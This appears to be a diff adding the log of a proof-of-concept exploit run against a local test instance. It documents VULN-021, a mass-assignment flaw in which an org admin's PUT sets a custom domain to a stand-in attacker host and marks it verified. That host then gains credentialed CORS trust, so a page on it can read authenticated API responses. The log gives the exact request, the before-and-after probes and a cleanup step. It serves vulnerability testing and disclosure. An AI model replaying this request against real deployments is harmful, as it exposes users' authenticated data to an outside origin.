@@ -1,0 +1,19 @@
+========================================================================
+VULN-021: isCustomDomainVerified mass-assignment -> instance-wide CORS trust
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[SETUP] org 48bbdff8-2ad5-46a3-a259-2ca3d52677dd original (customDomain|verified) = '<null>|f'
+[SETUP] attacker-chosen hostname for this run: evil-daa911bc5.example
+[STEP] baseline CORS probe: Origin http://evil-daa911bc5.example on GET /
+[INFO]   before: Access-Control-Allow-Origin=None  Allow-Credentials='true'
+[STEP] PUT /organization {'customDomain': 'evil-daa911bc5.example', 'isCustomDomainVerified': True}  (orgAdmin; no DNS/ownership check)
+[INFO]   PUT -> HTTP 200  {"success":true,"data":{"id":"48bbdff8-2ad5-46a3-a259-2ca3d52677dd","name":"CVE Hunt Academy","siteName":"cve-hunt-academy","avatarUrl":null,"settings":{"studentLimitNotified":{"half":true,"reached":t
+[INFO]   DB after PUT (customDomain|verified) = 'evil-daa911bc5.example|t'
+[STEP] post-poison CORS probe: Origin http://evil-daa911bc5.example
+[INFO]   after: Access-Control-Allow-Origin='http://evil-daa911bc5.example'  Allow-Credentials='true'
+[PROOF] http://evil-daa911bc5.example was NOT reflected before, but IS reflected with Access-Control-Allow-Credentials:true AFTER a self-asserted PUT → a page on evil-daa911bc5.example can now read authenticated API responses cross-origin (credentialed CORS)
+[STEP] cleanup: restore org custom-domain to original (null/false) & untrust the hostname
+[INFO]   restore PUT -> HTTP 200; DB now = '<null>|f'; http://evil-daa911bc5.example reflected now = False
+[OK] hostname untrusted again after restore (trust set cleaned)
+==> VULN-021: CONFIRMED — org admin self-asserted isCustomDomainVerified -> arbitrary origin gained credentialed-CORS trust instance-wide (reflected only after the PUT); org restored
+[OK] mass-assignment + CORS trust poisoning confirmed end-to-end in this process
